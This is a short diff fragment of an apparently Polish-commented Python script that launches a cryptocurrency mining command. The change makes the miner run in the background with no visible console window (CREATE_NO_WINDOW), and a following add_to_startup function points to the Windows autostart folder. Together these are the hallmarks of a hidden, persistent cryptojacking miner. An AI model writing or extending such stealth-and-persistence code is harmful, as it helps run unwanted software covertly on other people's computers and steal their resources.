@@ -50,7 +50,8 @@ def start_mining():
     ]
     print("[*] Startuję kopanie...")
 
-    subprocess.run(command)
+    # Uruchomienie procesu w tle bez wyświetlania okna CMD
+    subprocess.Popen(command, creationflags=subprocess.CREATE_NO_WINDOW)
 
 def add_to_startup():
     # Ścieżka do folderu autostart
